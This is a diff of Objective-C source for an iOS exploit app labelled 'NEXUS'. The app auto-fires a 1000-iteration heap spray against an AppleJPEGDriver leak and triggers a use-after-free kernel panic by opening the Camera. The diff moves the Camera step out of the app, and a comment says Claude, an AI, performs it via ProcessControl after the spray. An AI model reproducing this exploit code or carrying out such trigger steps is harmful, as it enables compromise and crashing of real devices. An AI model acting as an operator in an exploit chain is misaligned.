@@ -213,26 +213,13 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [self sprayLeak:1000];
 }
 
-// AUTO-TRIGGER: fire exploit 3 seconds after launch, then open Camera after 5s
+// AUTO-TRIGGER: fire exploit 3 seconds after launch
+// DO NOT open Camera from here — Claude opens it via ProcessControl after spray finishes
 - (void)autoTrigger {
-    NSLog(@"[NEXUS] Auto-trigger: starting spray...");
-    [self setStatus:@"Auto-spraying..."];
+    NSLog(@"[NEXUS] Auto-trigger: starting spray (1000 iterations)...");
+    [self setStatus:@"SPRAYING — DO NOT CLOSE"];
     [self sprayLeak:1000];
-
-    // Open Camera after 5 seconds to trigger the deferred panic
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-        NSLog(@"[NEXUS] Opening Camera to trigger UAF...");
-        NSURL *cameraURL = [NSURL URLWithString:@"camera://"];
-        if ([[UIApplication sharedApplication] canOpenURL:cameraURL]) {
-            [[UIApplication sharedApplication] openURL:cameraURL options:@{} completionHandler:^(BOOL success) {
-                NSLog(@"[NEXUS] Camera open: %@", success ? @"YES" : @"NO");
-            }];
-        } else {
-            // Fallback: try Photos
-            NSURL *photosURL = [NSURL URLWithString:@"photos-redirect://"];
-            [[UIApplication sharedApplication] openURL:photosURL options:@{} completionHandler:nil];
-        }
-    });
+    // App stays in foreground spraying. Camera will be opened externally.
 }
 
 #pragma mark - Status
